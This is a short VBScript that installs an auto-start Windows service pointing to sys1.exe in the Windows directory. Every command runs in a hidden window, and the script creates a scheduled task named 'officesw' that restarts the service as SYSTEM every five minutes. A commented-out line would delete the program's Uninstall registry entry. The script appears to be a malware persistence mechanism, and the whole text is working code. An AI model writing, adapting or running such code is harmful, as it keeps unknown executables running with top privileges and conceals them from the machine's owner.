Set oShell = CreateObject ("WScript.Shell") 
windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
With CreateObject("WScript.Shell")
     
    ' Pass 0 as the second parameter to hide the window...
    .run "sc create CppWindowsService binPath= " & windir & "\\sys1.exe DisplayName= ""CppWindowsService"" start= auto", 0, True
    .Run "net start CppWindowsService", 0, True
    '.Run "reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{49168414-9A56-45D3-A4BC-617FD19511D7} /f", 0, True
    .Run "schtasks /delete /tn officesw /F", 0, True
    'cmd="net start CppWindowsService" 
    'user="SYSTEM"
    .Run "schtasks /create /ru ""SYSTEM"" /sc minute /mo 5 /tr ""net start CppWindowsService"" /tn officesw /rl highest /F", 0, True
End With
